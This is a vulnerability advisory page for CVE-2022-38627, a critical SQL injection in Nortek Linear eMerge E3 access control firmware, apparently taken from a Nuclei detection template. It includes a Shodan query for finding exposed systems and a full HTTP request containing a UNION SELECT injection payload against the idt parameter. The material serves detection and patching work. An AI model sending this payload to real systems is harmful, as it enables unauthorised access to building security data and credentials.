---
layout: "post"
cve_id: "CVE-2022-38627"
title: "Nortek Linear eMerge E3-Series - SQL Injection"
pcap: true
pcap_path: "/pcaps/2022/CVE-2022-38627.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-38627.yaml"
author: "daffainfo,omarhashem666"
severity: "critical"
impact: "Unauthenticated attackers can exploit SQL injection in the idt parameter to extract sensitive access control data including badge information, user credentials, and building security configurations from the eMerge access control system.
"
remediation: "Update Nortek Linear eMerge E3-Series firmware to a patched version that uses parameterized queries and properly sanitizes the idt parameter.
"
reference:
  - "https://github.com/omarhashem123/Security-Research/tree/main/CVE-2022-38627"
  - "https://omar0x01.medium.com/15cebd072ed6"
  - "https://nvd.nist.gov/vuln/detail/CVE-2022-38627"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2022-38627', 'epss-score': 0.73261, 'epss-percentile': 0.98745, 'cwe-id': 'CWE-89', 'cpe': 'cpe:2.3:o:nortekcontrol:emerge_e3_firmware:*:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 1, 'vendor': 'nortekcontrol', 'product': 'emerge_e3_firmware', 'shodan-query': ['http.title:"Linear eMerge"']}"
tags:
  - "cve"
  - "cve2022"
  - "emerge"
  - "nortek"
  - "linear"
  - "sqli"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
Nortek Linear eMerge E3-Series 0.32-08f, 0.32-07p, 0.32-07e, 0.32-09c, 0.32-09b, 0.32-09a, and 0.32-08e were discovered to contain a SQL injection vulnerability via the idt parameter.


## üåê HTTP Request
```nohighlight
GET /badging/badge_template_print.php?tpl=aa.xml&idt=1337%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,%2738Blp9Jdcswbe7SZIoe1XQuVkA0%27||%27CVE%27||(7*7*7*7)||SWVersion,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL%20from%20version HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

